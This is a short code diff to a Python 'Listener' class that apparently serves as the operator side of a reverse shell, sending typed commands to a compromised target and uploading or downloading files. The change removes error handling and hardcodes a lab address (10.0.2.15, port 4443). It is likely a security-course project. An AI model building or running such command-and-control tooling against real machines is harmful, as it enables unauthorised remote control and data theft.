@@ -49,20 +49,20 @@ class Listener:
             command = input(">> ")
             command = command.split(" ")
 
-            try:
-                if command[0] == "upload":
-                    file_content = self.read_file(command[1])
-                    command.append(file_content)
-                result = self.execute_remotely(command) # Sends the command to receiving target
-                if command[0] == "download" and "[-] Error " not in result:
-                    result = self.write_file(command[1], result)
-            except Exception:
-                result = "[-] Error while handling command"
+            # try:
+            if command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content.decode())
+            result = self.execute_remotely(command) # Sends the command to receiving target
+            if command[0] == "download" and "[-] Error " not in result:
+                result = self.write_file(command[1], result)
+            # except Exception as e:
+               # result = "[-] Error while handling command " + str(e)
 
             print(result)
 
 
-print("[+] Please enter source-ip and port")
-args = [input("Enter source-ip: "), input("Enter port number: ")]
-my_listener = Listener(args[0], int(args[1]))
+# print("[+] Please enter source-ip and port")
+# args = [input("Enter source-ip: "), input("Enter port number: ")]
+my_listener = Listener("10.0.2.15", 4443)
 my_listener.run()
